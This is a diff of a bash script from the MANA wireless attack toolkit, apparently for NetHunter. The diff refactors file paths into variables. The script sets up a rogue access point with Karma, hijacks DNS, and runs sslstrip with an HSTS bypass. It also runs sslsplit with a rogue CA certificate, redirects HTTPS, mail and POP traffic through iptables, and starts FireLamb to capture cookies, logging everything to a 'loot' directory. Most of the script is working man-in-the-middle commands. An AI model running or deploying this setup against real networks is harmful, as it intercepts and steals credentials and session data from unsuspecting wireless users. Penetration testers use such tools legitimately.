@@ -1,9 +1,13 @@
 #!/bin/bash
+etc=/etc/mana-toolkit
+lib=/usr/lib/mana-toolkit
+loot=/var/lib/mana-toolkit
+share=/usr/share/mana-toolkit
 #start-nat-full.sh - Will fire up MANA in NAT mode (you'll need an upstream link) with all the MitM bells and whistles.
 upstream=wlan0
 phy=wlan1
 conf=/sdcard/nh_files/configs/hostapd-karma.conf
-hostapd=/usr/lib/mana-toolkit/hostapd
+hostapd=$lib/hostapd
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 rfkill unblock wlan
@@ -20,7 +24,7 @@ ip route add default via 10.0.0.1 dev $phy
 sed -i "s/^interface=.*$/interface=$phy/" $conf
 $hostapd $conf &
 sleep 5
-dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
+dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo
 sleep 5
 
 # Add fking rule to table 1006
@@ -51,15 +55,15 @@ iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 
 #SSLStrip with HSTS bypass
-cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
-python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
+cd $share/sslstrip-hsts/sslstrip2/
+python sslstrip.py -l 10000 -a -w $loot/sslstrip.log&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
+cd $share/sslstrip-hsts/dns2proxy/
 python dns2proxy.py -i $phy&
 cd -
 
 #SSLSplit
-sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
+sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
@@ -80,7 +84,7 @@ iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 995  -j REDIREC
 iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 110 -j REDIRECT --to-port 10110
 
 # Start FireLamb
-/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &
+$share/firelamb/firelamb.py -i $phy &
 
 sleep 5
 
